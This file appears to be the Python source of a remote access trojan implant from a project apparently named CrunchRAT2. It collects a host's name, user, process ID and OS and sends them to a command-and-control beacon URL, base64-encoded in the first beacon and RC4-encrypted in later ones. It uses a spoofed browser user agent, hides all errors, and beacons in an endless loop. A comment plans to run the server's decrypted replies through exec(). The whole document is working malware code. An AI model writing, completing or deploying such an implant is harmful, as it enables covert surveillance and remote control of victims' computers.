import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time

import json

# TO DO: Remove hard-coded value
beacon_url = "http://127.0.0.1/CrunchRAT2/Website/beacon.php"

# TO DO: Remove hard-coded value
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"

# TO DO: Add in sleep interval jitter
sleep_interval = 10


def crypt(key, data):
    S = range(256); j = 0; out = []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i] , S[j] = S[j] , S[i]

    i = j = 0

    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

    return "".join(out)


def initial_beacon():
    try:
        hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
        current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
        process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
        operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))

        if "Darwin" in platform.system():
            globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
        else:
            globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

        globals()[hostname_var] = socket.gethostname()
        globals()[current_user_var] = getpass.getuser()
        globals()[process_id_var] = os.getpid()

        post_data = [(hostname_var, globals()[hostname_var]),
            (current_user_var, globals()[current_user_var]),
            (process_id_var, globals()[process_id_var]),
            (operating_system_var, globals()[operating_system_var])]

        base64_encoded = base64.b64encode(urllib.urlencode(post_data))
        request = urllib2.Request(beacon_url, base64_encoded)
        request.add_header("User-Agent", user_agent)
        f = urllib2.urlopen(request)
        response = f.read()
        return response
    except:
        pass


def rc4_beacon(key):
    try:
        if "Darwin" in platform.system():
            operating_system = "Mac OS X " + platform.mac_ver()[0]
        else:
            operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

        hostname = socket.gethostname()
        current_user = getpass.getuser()
        process_id = os.getpid()

        params = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system, "nonce": "1"}
        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(params)))
        request.add_header("User-Agent", user_agent)
        request.add_header("Content-Type", "application/json")
        f = urllib2.urlopen(request)
        response = f.read()
        return response
    except:
        pass


if __name__ == "__main__":
    counter = 0

    while True:
        if counter == 0:
            k = initial_beacon()
        else:
            rc4_beacon(k) # TO DO: This the output returned from this will get decrypted and ran through a Python exec() function

        counter += 1
        time.sleep(sleep_interval)
